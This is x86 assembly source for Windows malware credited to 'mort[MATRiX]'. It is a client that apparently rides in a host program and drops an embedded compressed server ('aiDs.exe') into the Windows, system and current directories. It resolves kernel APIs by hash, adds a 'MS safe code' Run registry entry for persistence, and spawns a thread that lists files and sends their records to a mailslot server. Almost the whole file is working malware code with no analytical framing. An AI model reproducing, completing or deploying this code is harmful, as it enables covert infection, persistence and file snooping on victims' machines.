          

.586
.model flat,stdcall

extrn               ExitProcess         : proc
extrn               MessageBoxA         : proc
extrn               GlobalDeleteAtom    : proc
extrn               GlobalFindAtomA     : proc

include share.inc

_debug              = 1
include share.inc

;---( legal data )------------------------------------------------------
.data?
_ACwBuffer          db 02400h dup(?)    ;Anaktos working buffer
_ACcBuffer          db 03000h dup(?)    ;compresed server

.data
_aidServer          label
include             aiDSAC.inc          ;server in hex mode

_aidS               db 'aid-s.exe',0
_mess               db 'echm,...properly installed',0
_title              db '.aid(c) by mort[MATRiX]',0


;---( code )-------------------------------------------------------------
.code
@aid_c:
          if _debug
          push offset _sm
          call GlobalFindAtomA
          push eax
          call GlobalDeleteAtom
          push offset _sm1
          call GlobalFindAtomA
          push eax
          call GlobalDeleteAtom
          endif
          
          call @compressServer
                              
@retAdd             label          
          jmp  @aid_cEntry

          call MessageBoxA,0,offset _mess,offset _title,0
          call ExitProcess,0


@compressServer:
          push offset _ACwBuffer
          push 08192
          push offset _aidServer
          push offset _ACcBuffer
          call anaktos_compress
          
          mov eax,dword ptr [_ACcBuffer + 6]
          mov [_psSize],eax
          mov dword ptr [offset _aiDsHostAdd1],offset _ACcBuffer
          mov dword ptr [offset _aiDsHostAdd2],offset _ACcBuffer
          ret

;---( Anaktos part )----------------------------------------------------

; ANKTS_C.INC  -  Huffman Compression in 32bit ASSEMBLY 
; Ver 1.00
;
; ANAkTOS (c)1999 
; Europe/Greece 
;------------------------------------------------------
; Size: 382 bytes
ac_destinationdata	          equ	24h+ 0
ac_sourcedata		equ	24h+ 4
ac_orig_size		equ	24h+ 8
ac_workingdata		equ	24h+ 12
ac_treesize		equ	400h
ac_ids_offset		equ	(ac_treesize*4)*1
ac_weights_offset             equ	(ac_treesize*4)*0
ac_parents_offset             equ	(ac_treesize*4)*2
ac_leftchilds_offset	equ	(ac_treesize*4)*3
ac_rightchilds_offset	equ	(ac_treesize*4)*4
;Memory layout
;The working buffer is used for bulding the huffman tree.
;It holds 1024 records. Each record consists of 5 DW values.
; offset
; 0000h-0003h	first value of record 1
; 0004h-0007h	first value of record 2
; ....
; 0FFCh-0FFFh	first value of record 1024
; 1000h-1003h	second value of record 1
; 1004h-1007h	second value of record 2
; ...
; 2000h-2003h	third value of record 1
; ...
; 3000h-3003h	forth value of record 1
; ...
;Record structure
; NAME	     OFFSET   	 SIZE 	WHAT?
; WEIGHT     000h-0FFFh	 DWORD	The frequency/weight of this leaf/node.
; 				If = 000h this node/leaf is not used.
; ID         1000h-1FFFh DWORD	If = 000h it's a leaf. It's record number represents the character.
; 				if = 1000h it's a node.
; PARENT     400h-7FFh	 DWORD	The record number of the parent node.
;				If =0FFFFFFFFh this node/leaf doesn't have a parent yet.
; LEFTCHILD  800h-7FFh	 DWORD	The record number of the left child node.
;				If =0FFFFFFFFh this node doesn't have a child yet.
; RIGHTCHILD a00h-cFFh	 DWORD	The record number of the right child node.
;				If =0FFFFFFFFh this node doesn't have a child yet.
anaktos_compress:
	pushad 
	mov ebp,esp
	;load input into regs
	mov edi,ss:[ebp+ac_workingdata] ;working buffer
	;INITIALIZE THE TREE
	push edi
	;set IDs/weigths to 0 
	xor eax,eax	
	mov ecx, ac_treesize*2
	rep stosd
	;set parents/leftchilds/rightchilds to FFFFFFh
	dec eax		;eax=-1
	mov ecx, ac_treesize*3
	rep stosd
	pop edi
	;load input into regs
	mov ecx,ss:[ebp+ac_orig_size] ;load size
	mov esi,ss:[ebp+ac_sourcedata] ;load  source
	;GET the weigths
	push ecx
	push esi
	xor eax,eax
ac_get_weights:	
	lodsb
	inc dword ptr [edi+eax*4+ac_weights_offset]
	loop ac_get_weights
	pop esi
	pop ecx	
	push ecx
	push esi
ac_buildHuffmanTree:
	;find the two records with the lowest weigths, that doesn't have a parent
	call ac_find_two_records
	cmp ebx,0FFFFFFFFh
	jz ac_buildHuffmanTree_done
;	eax - a record with no parent and the lowest possible weight  
;	ebx - a record with no parent and the lowest possible weight after eax
;	esi - a free record (weight=0)
	xchg eax,ebx
	;create a new record and set the childs/parent
	mov ecx,[edi+eax*4+ac_weights_offset] ;weight of left child
	add ecx,[edi+ebx*4+ac_weights_offset] ;+weight of right child
	mov [edi+esi*4+ac_weights_offset],ecx  ; to weight of new node 
	add dword ptr [edi+esi*4+ac_ids_offset],1000h ;change type
	mov [edi+eax*4+ac_parents_offset],esi	; set parent of left node
	mov [edi+ebx*4+ac_parents_offset],esi	; set parent of right node
	mov [edi+esi*4+ac_leftchilds_offset],eax	; set left node
	mov [edi+esi*4+ac_rightchilds_offset],ebx	; set right node
	jmp ac_buildHuffmanTree
ac_buildHuffmanTree_done:
	pop esi	
	pop ecx
	push ecx
	push esi
	mov ebx,eax	;ebx top node
	;build a nested structured of that tree, into the destination buffer 
	cld
	mov esi,edi;working buffer
	mov edi,ss:[ebp+ac_destinationdata] ;destination
	mov ax,'AC'   ;mark of compression
	stosw
	mov eax,ecx ;load size
	;eax - size
	;esi - working  buffer
	;edi - destination buffer
	stosd ;write the size
	stosd ;keep a Dword for compressed size
	stosd ;keep a Dword for bitstream offset
	call ac_build_nested_structure
	;edi - starting position of bitstream
	pop esi
	pop ecx
	;edi - starting position of bitstream
	;ecx - size of source
	;esi - offset of source
	;mov ecx,ss:[ebp+ac_orig_size] ;load size
	;mov edx,[ebp+ac_sourcedata] ;source
	mov edx,esi ;source
	mov esi,[ebp+ac_destinationdata] ;destination
	call ac_translate
	popad
	ret 16
	ret
ac_find_two_records:
;returns
;	eax - a record with no parent and the lowest possible weight  
;	ebx - a record with no parent and the lowest possible weight after eax
;	esi - a free record (weight=0)
	push ecx
	push edx
	push ebp
	or eax,-1
	xor ebx,eax
	xor esi,esi
	xor ecx,ecx
	or ebp,-1
	mov ecx,3FFh
	;load the last record's weight  
	or edx,-1
ac_find_lowest:	 
	;is it free? Keep it on esi
	cmp dword ptr [edi+ecx*4+ac_weights_offset],0
	jnz ac_find_two_records_notempty
	mov esi,ecx
	jmp ac_next_record 
ac_find_two_records_notempty:
	cmp dword ptr [edi+ecx*4+ac_parents_offset],0FFFFFFFFh
	jnz ac_next_record
	cmp edx,dword ptr [edi+ecx*4+ac_weights_offset]
	jc ac_next_record
	mov edx,dword ptr [edi+ecx*4+ac_weights_offset]
	mov ebx,ecx	
	cmp edx,ebp
	jnc ac_next_record		
	xchg eax,ebx
	xchg edx,ebp
ac_ch_second:
ac_next_record:
	dec ecx
	cmp ecx,0ffffffffh 
	jnz ac_find_lowest
ac_find_lowest_ok:
	pop ebp
	pop edx
	pop ecx	
	ret
ac_build_nested_structure:
	;	esi - working  buffer
	;	edi - destination buffer
	;	edx - current depth
	;	ebx - current node/leaf

	push eax
	push ebx	
	cmp ebx,0ffffffffh
	jz  ac_build_nested_structure_leaf
	cmp dword ptr [esi+ebx*4+ac_ids_offset],256
	jc ac_build_nested_structure_leaf
ac_build_nested_structure_node:
	;begin of group
	mov al,0FFh
	stosb
	mov eax,ebx
	mov ebx,[esi+eax*4+ac_leftchilds_offset] ;take the left node
	call ac_build_nested_structure
	mov ebx,[esi+eax*4+ac_rightchilds_offset] ;take the right node
	call ac_build_nested_structure
	mov ebx,eax
	pop ebx
	pop eax
	ret
ac_build_nested_structure_leaf:
	cmp bl,0FEh
	jc ac_build_nested_structure_leaf_no_FE 	
	mov al,0FEh
	stosb
ac_build_nested_structure_leaf_no_FE:
	mov al,bl
	stosb
	pop ebx
	pop eax
	ret
ac_translate:
	;input
	;	edi - starting position of bitstream
	;	ecx - size of source
	;	esi - offset of source

	xor ebx,ebx
	sub edi,esi
	mov [esi+10],edi
	add edi,esi
	add esi,14
	;edi - starting position of bitstream
	;ecx - size of source
	;esi - nested tree
	;edx - offset of source
	ac_translate_loop:
	push ecx
	mov esi,[ebp+ac_destinationdata] 	;esi - nested tree
	add esi,14
	mov ah,[edx]
	inc edx
	mov ecx,ebx
	call ac_translate1
	pop ecx	
	loop ac_translate_loop
	mov esi,[ebp+ac_destinationdata] 	;esi - nested tree
	shr ebx,3
	inc ebx
	mov [esi+6],ebx
	ret
ac_translate1:
	;al - char
	lodsb 
	cmp AL,0FFh
	jnz ac_no_FF
	inc ebx
	inc ecx
	call ac_translate1
	jc ac_check_second
	dec ecx
	BTR [edi],ecx
	jmp ac_translate_end_ok
ac_check_second:
	call ac_translate1
	jc ac_check_second_faild
	dec ecx
	BTS [edi],ecx
	jmp ac_translate_end_ok
ac_check_second_faild:	
	dec ecx
	dec ebx
	stc
	ret	
ac_no_FF:
	cmp al,0FEh
	jnz ac_is_noExt_ch1
	lodsb
ac_is_noExt_ch1:
	cmp AL,ah
	jz  ac_translate_end_ok
	stc
	ret
ac_translate_end_ok:
	clc
	ret
;---( Anaktos part )----------------------------------------------------


;---( entrypoint )------------------------------------------------------

@aid_cEntry:
          push offset @retAdd
@hostRetAddress               equ $ - 4

          call @overData
_c1                 label
          ret
_oldB               db _oldBnum dup(090h)

;---( Anaktos part )----------------------------------------------------
; ANKTS_D.INC  -  Huffman Decompression in 32bit ASSEMBLY 
; Ver 1.00
; ANAkTOS (c)1999 
; Europe/Greece 
; Size: 79 bytes

ad_sourcedata                 equ       24h+ 0
ad_destinationdata            equ       24h+ 4

anaktos_decompress:
	pushad 
	mov ebp,esp
	;load input into regs
	cld
	mov esi,[ebp+ad_destinationdata] ;load  source
	mov edx,esi
	mov edi,[ebp+ad_sourcedata] ;load destination
	lodsw		;mark
	cmp ax,'AC'	
	jnz ad_end
	lodsd		;size
	mov ecx,eax 
	lodsd 		;skip the bitstreamsize
	lodsd		;offset off bitstream	
	add edx,eax
	xor ebx,ebx
ad_loop:
	push esi
ad_innerloop:
	lodsb
	cmp al,0FEh
	jz ad_is_FE
	jc ad_is_char
	bt [edx],ebx
	inc ebx
	jnc ad_innerloop
	call ad_dive
	jmp ad_innerloop
ad_is_FE:	
	lodsb
ad_is_char:
	stosb
	pop esi
	loop ad_loop
ad_end:
	popad
	ret 8
ad_dive:	
	lodsb
	cmp al,0FEh
	jz ad_dive_is_FE
	jc ad_dive_is_char
	call ad_dive
	call ad_dive
	ret	
ad_dive_is_FE:
	lodsb
ad_dive_is_char:
	ret	
@apEnd              label
;---( Anaktos part )----------------------------------------------------


_c2                 label
;---( data )------------------------------------------------------------
@delta              label             

_kernells           label
          dd 0bff70000h - 1   ;w9x
          dd 077f00000h - 1   ;NT 4
          dd 077e80000h - 1   ;NT 5
          dd -1
          
_APIstart               label
          _CloseHandle                  dd 0
          _CreateFileA                  dd 0
          _CreateFileMappingA           dd 0
          _CreateMutexA                 dd 0
          _CreateThread                 dd 0
          _ExitThread                   dd 0
          _FindFirstFileA               dd 0
          _FindNextFileA                dd 0
          _FreeLibrary                  dd 0
          _GetCurrentDirectoryA         dd 0
          _GetLastError                 dd 0
          _GetModuleHandleA             dd 0
          _GetProcAddress               dd 0
          _GetSystemDirectoryA          dd 0
          _GetWindowsDirectoryA         dd 0
          _GlobalAddAtomA               dd 0
          _GlobalAlloc                  dd 0
          _GlobalFindAtomA              dd 0
          _GlobalFree                   dd 0
          _LoadLibraryA                 dd 0
          _MapViewOfFile                dd 0
          _ReleaseMutex                 dd 0
          _ResumeThread                 dd 0
          _SetThreadPriority            dd 0
          _Sleep                        dd 0
          _WaitForSingleObject          dd 0
          _WriteFile                    dd 0
          _lstrcat                      dd 0
_APIend                 label

_APIlen             = _APIend - _APIstart
_APIcount           = _APIlen / 4

_APICRCs                label
                    dd 09b65656dh ;CloseHandle
                    dd 072507bd9h ;CreateFileA
                    dd 0b5081bb3h ;CreateFileMappingA
                    dd 0c3505fd3h ;CreateMutexA
                    dd 00dac8f7bh ;CreateThread                    
                    dd 06a649761h ;ExitThread
                    dd 05d06ca65h ;FindFirstFileA
                    dd 07341ead9h ;FindNextFileA
                    dd 027bca5a7h ;FreeLibrary
                    dd 0341509f4h ;GetCurrentDirectoryA
                    dd 0ea72536dh ;GetLastError
                    dd 0aa414fcah ;GetModuleHandleA
                    dd 073773b4fh ;GetProcAddress
                    dd 08a0c1ae6h ;GetSystemDirectoryA
                    dd 0ea1055bch ;GetWindowsDirectoryA
                    dd 0928433dah ;GlobalAddAtomA
                    dd 037cb1f65h ;GlobalAlloc
                    dd 06ad077fbh ;GlobalFindAtomA
                    dd 02f596dd3h ;GlobalFree
                    dd 0b48395bch ;LoadLibraryA
                    dd 0b36cb755h ;MapViewOFile
                    dd 0669e1ad9h ;ReleaseMutex
                    dd 0534c9fd8h ;ResumeThread
                    dd 0d0ef2d8dh ;SetThreadPriority
                    dd 0a74e1b4ch ;Sleep
                    dd 0c6ee8762h ;WaitForSingleObject
                    dd 06c765f2fh ;WriteFile
                    dd 04d051574h ;lstrcat
                    dd 1
                
_sm                 db '.aiD properlly installed',0 ;atom mark
_sm1                db '.aiD properlly running',0   ;atom mark
_msName             db '\\.\mailslot\aiD',0         ;mailslot name


;---( code )------------------------------------------------------------
@APIcrc:        ;get API crc number in eax
        
          push ebx ecx esi
        
          xchg eax,esi
          xor eax,eax
          xor ebx,ebx
        
@nextB:    
          rol eax,8      
          mov ecx,0100h
          xchg al,bl
          lodsb
          or al,al
          jz @CRCdone
        
@loopie:
          shr ecx,1           
          jz @nextB
          test eax,ecx
          jnz @loopie
          rol eax,1
          test eax,ecx
          jnz @loopie
          rol eax,1
          inc eax
          jmp @loopie
        
@CRCdone:
          xchg al,bl
        
          pop esi ecx ebx
          ret
        
;-----------------------------------------------------------------------
@overData:
          pushad

          mov eax,[esp + 20h]           ;get delta
          add eax,_c2 - _c1
          mov [eax + @deltaT - @delta],eax
          xchg eax,ebp

          lea esi,[ebp + _kernells - @delta]

          push ebp
                    
@nextKernell:                           ;get kernell base
          lodsd
          inc eax
          jz @fuck
          
          push esi
          call @SEH

          mov esp,[esp + 8]
          sub eax,ebx
          
@fuck1:
          pop dword ptr fs:[0]
          pop ebx esi
          jnz @nextKernell
        
          mov ebx,eax                   ;get APIs
          add eax,[eax + 03ch]
          mov eax,[eax + 078h]
          add eax,ebx
          add eax,018h
          xchg eax,esi

          pop ebp
          push _APIcount
          lodsd
          push eax        ;names number
          inc eax
          push eax
          lodsd
          push eax        ;funcs address
          lodsd
          push eax        ;names address
          lodsd
          push eax        ;ordinals address

          mov eax,[esp + 4]
          add eax,ebx
          xchg eax,esi
          
          lea edi,[ebp + _APIstart - @delta]
        
@nextAPI:
          dec dword ptr [esp + 0ch]
        
          lodsd                         ;check API
          add eax,ebx
          call @APIcrc
          cmp eax,[edi + _APIlen]
          jnz @nextAPI

          mov eax,[esp + 010h]          ;get API address
          sub eax,[esp + 0ch]
          shl eax,1
          add eax,[esp]
          add eax,ebx
          push esi
          xchg eax,esi
          xor eax,eax
          lodsw
          shl eax,2
          add eax,[esp + 0ch]
          add eax,ebx
          xchg eax,esi
          lodsd
          add eax,ebx
          mov dword ptr [edi],eax
          scasd
          pop esi
          dec dword ptr [esp + 014h]
          jnz @nextAPI
        
@lastAPIDone:
          add esp,018h    ;clear stack

          lea eax,[ebp + _sm1 - @delta]  ;check if server is running
          push eax          
          call [ebp + _GlobalFindAtomA - @delta]
          call [ebp + _GetLastError - @delta]
          or eax,eax
          jz @allreadyInstalled

          lea eax,[ebp + _sm - @delta]  ;check if server is installed
          push eax          
          call [ebp + _GlobalFindAtomA - @delta]
          call [ebp + _GetLastError - @delta]
          or eax,eax
          jnz @install
          jmp @fuck

@allreadyInstalled:
          lea eax,[ebp + _fw - @delta]         ;create resident thread
          xchg eax,ebx
          lea eax,[ebp + @aiDClient - @delta]
          push ebx
          push 4 0
          push eax
          push 0 0
          call [ebp + _CreateThread - @delta]

          push eax
          push 016
          push eax
          call [ebp + _SetThreadPriority - @delta]
          call [ebp + _ResumeThread - @delta]
                    
@fuck:                                  ;restore host
          cld
          lea esi,[ebp + _oldB - @delta]
          mov edi,[esp + 024h]
          movsd
          movsb
          popad          
          ret

;---( install aiD server )----------------------------------------------
_aiDupServer        = 0200h             ;server mem store-place
KEY_ALL_ACCESS      = 0f003fh           ;registers const
_aiDserver          db '\aiDs.exe',0    ;server name
_fw                 dd ?                ;help variable
_GetFAdd            label               ;GetXDirectory address
          dd ?,?,?
_regHNDL            dd ?                ;registry handle
_keyN               db 'MS safe code',0 ;key name
_regSub1st          db '.DEFAULT\'      ;sub-keys
_regSub             db 'Software\Microsoft\Windows\CurrentVersion\Run',0

@install:
          call @pushAA32                    ;prepare APIs we'll use
          db 'advapi32.dll',0

@pushAA32:
          call [ebp + _GetModuleHandleA - @delta] ;get register's lib
          or eax,eax

          lahf
          xchg eax,edi
          
          jnz @fine
          
          push dword ptr [esp - 4]                ;load register's lib
          call [ebp + _LoadLibraryA - @delta]              

          push eax                                ;for FreeLibrary

@fine:          
          push edi
          
          mov dword ptr [ebp + _aa32Base - @delta],eax
          lea eax,[ebp + _regSub1st - @delta]     ;for first reg open
          mov [ebp + _rs - @delta],eax
          
          lea esi,[ebp + offset _GetCurrentDirectoryA - @delta]
          lea edi,[ebp + offset _GetFAdd - @delta]
          push edi
          movsd
          lodsd
          lodsd
          lodsd
          movsd
          movsd
          pop edi

          push 04000h                   ;alocate some needed space
          push 040h
          call [ebp + _GlobalAlloc - @delta]

          push  012345678h              ;decompres server 
_aiDsHostAdd1       equ $ - 4

          lea ebx,[eax + _aiDupServer]
          push ebx
          call anaktos_decompress

          push 03h            ;three direcotries to store server
          push eax eax
          push 0200h          
          
@nextGetF:
          call [edi]                    ;call getXdir API
          push 0200h
          push dword ptr [esp + 4]          
          scasd

          lea eax,[ebp + offset _aiDserver - @delta]
          push eax
          push dword ptr [esp + 4]
          call [ebp + _lstrcat - @delta]          ;prepare name

          push eax                                ;for registry adding

          push eax
          push 0 0 2 0 1                          ;create new file
          push 80000000h or 40000000h
          push eax
          call [ebp + _CreateFileA - @delta]
          pop esi
          add esi,0200h          
          push eax                                ;for CloseHandle
          xchg eax,ebx
          push 0
          lea eax,[ebp + offset _fw - @delta]
          push eax
          push _aiDsSize
          push esi
          push ebx
          call [ebp + _WriteFile - @delta]        ;write to new file
          call [ebp + _CloseHandle - @delta]      

          lea eax,[ebp + _regHNDL - @delta]       ;registry stuff
          push eax
          push KEY_ALL_ACCESS
          push 0
          push 012345678h
_rs                 equ $ - 4           ;reg sub key          
          dec dword ptr [ebp + _adding - @delta]
          mov eax,80000004h
_adding             equ $ - 4
          push eax
          call @RegOpen                 ;open key
          
          pop eax             ;new key

          push 255
          push eax
          push 1
          push 0
          lea eax,[ebp + _keyN - @delta]
          push eax
          mov eax,[ebp + _regHNDL - @delta]
          push eax
          call @RegSet                  ;set new value
                  
          mov eax,[ebp + _regHNDL - @delta]  
          push eax
          call @RegClose                ;and close it
          
          dec dword ptr [esp + 0ch]
          jnz @nextGetF

          call [ebp + _GlobalFree - @delta]       ;release workspace
          add esp,0ch
          
          lea eax,[ebp + offset _sm - @delta]
          push eax
          call [ebp + _GlobalAddAtomA - @delta]
          
          ;DEBUG
          push eax
          call GlobalDeleteAtom                              
          ;DEBUG

          popf
          jz @fuck2
          
          call [ebp + _FreeLibrary - @delta]
@fuck2:
          jmp @fuck

;---( registers functions )---------------------------------------------
@RegOpen:
          call @hirwigo
          db 'RegOpenKeyExA',0
@RegSet:
          call @hirwigo
          db 'RegSetValueExA',0

@RegClose:
          lea eax,[ebp + _regSub - @delta]     ;for first reg open
          mov [ebp + _rs - @delta],eax
          
          call @hirwigo
          db 'RegCloseKey',0

@hirwigo:
          push 012345678h
_aa32Base           equ $ - 4
          call [ebp + _GetProcAddress - @delta]
          
          pop esi
          call eax
          jmp esi

;---( aiD client thread )-----------------------------------------------
;data
_wait               = 0
_max_path           = 260
 filetime           struc
         FT_dwLowDateTime        dd ?              
         FT_dwHighDateTime       dd ?              
filetime           ends              
fileSearch         struc             
         FileAttributes          dd ?              
         CreationTime            filetime ?        
         LastAccessTime          filetime ?        
         LastWriteTime           filetime ?        
         FileSizeHigh            dd ?              
         FileSizeLow             dd ?              
         Reserved0               dd ?              
         Reserved1               dd ?              
         FileName                db _max_path dup(?)
         AlternateFileName       db 13 dup(?)     
                                 db 3 dup(?)      
fileSearch         ends             

_mutex              db 'aid synch mutex',0
_fm                 db 'aiD-fm',0       ;mapped data file
_fmBase             dd ?
_mask               db '*.*',0
_mutexHNDL          dd ?
_psSize             dd ?                ;size of packed server

;code
@aiDClient          label
          mov ebp,012345678h
@deltaT             equ $ - 4
          
          lea eax,[ebp + _fm - @delta]  ;map our baby for server use
          push eax
          push _fmSize
          push 0 4 0
          push -1 
          call [ebp + _CreateFileMappingA - @delta] 
          push _fmSize 0 0 2 eax
          call [ebp + _MapViewOfFile - @delta]
          xchg eax,edi

          mov eax,@endL - @aid_cEntry             ;client size
          stosd
          add eax,[ebp + _psSize - @delta]        ;whole size
          stosd
          mov eax,_aiDsHostAdd1 - @aid_cEntry     ;first patch1
          stosd
          mov eax,_aiDsHostAdd2 - @aid_cEntry     ;secounf patch
          stosd

          lea esi,[ebp + @aid_cEntry - @delta]    ;copy client
          mov ecx,@endL - @aid_cEntry             ;client size
          rep movsb

          mov esi,012345678h                      ;copy packed server
_aiDsHostAdd2       equ $ - 4
          mov ecx,[ebp + _psSize - @delta]        ;whole size
          rep movsb
                    
          lea eax,[ebp + _mutex - @delta]         ;get access to mutex
          push eax
          push 0 0
          call [ebp + _CreateMutexA - @delta]

          mov [ebp + _mutexHNDL - @delta],eax
          
          push 01000h         ;allocate space for fileSearch buffer
          push 040h          
          call [ebp + _GlobalAlloc - @delta]

          push eax
          push eax

          add eax,0320
          push eax
          push _max_path
          call [ebp + _GetCurrentDirectoryA - @delta]
    
          ;find first file to send
          lea eax,[ebp + _mask - @delta]
          push eax
          call [ebp + _FindFirstFileA - @delta]

          push eax
                    
@examineA:
          mov eax,[esp + 4]
          mov bl,byte ptr [eax + FileAttributes]
          and bl,010h
          cmp bl,010h
          jz @findNext
          
@sendMess2Server:             ;send message to server

          xchg eax,ebx                  ;for writefile
          lea eax,[ebp + _fw - @delta]  ;for writefile
          push 0                        ;for writefile
          push eax                      ;for writefile
          push _msMessSize              ;for writefile
          push ebx                      ;for writefile

          push -1                            ;wait for mailslots free
          push dword ptr [ebp + _mutexHNDL - @delta]
          call [ebp + _WaitForSingleObject - @delta]

          push 0 080h 3 0 1             ;open mailslot
          push 020000h or 2 or 0100h or 010h or 4 or 0100000h
          lea eax,[ebp + _msName - @delta]
          push eax
          call [ebp + _CreateFileA - @delta]
          
          push eax            ;push mailslot handle like last param
          xchg eax,edi
          call [ebp + _WriteFile - @delta]        ;send server a file record

          push edi
          call [ebp + _CloseHandle - @delta]
          
          push dword ptr [ebp + _mutexHNDL - @delta]
          call [ebp + _ReleaseMutex - @delta] ;release access
          
          if _debug
          elseif                   
          push _wait
          call [ebp + _Sleep - @delta]
          endif
          
@findNext:                              ;find next file
          push dword ptr [esp + 4]
          push dword ptr [esp + 4]
          call [ebp + _FindNextFileA - @delta]
          dec eax
          jz @examineA
          
          pop eax eax
          xor eax,eax
          and dword ptr [esp],eax
          call [ebp + _ExitThread - @delta]

;-----------------------------------------------------------------------
@SEH:                                   ;check kernell basess
          push dword ptr  fs:[0]
          mov dword ptr fs:[0],esp
          
          cmp eax,[eax + 0b4h]
          jz @fuck11
          cmp eax,[eax + 0104h]
          
@fuck11:
          jmp @fuck1
@endL               label
          
end @aid_c
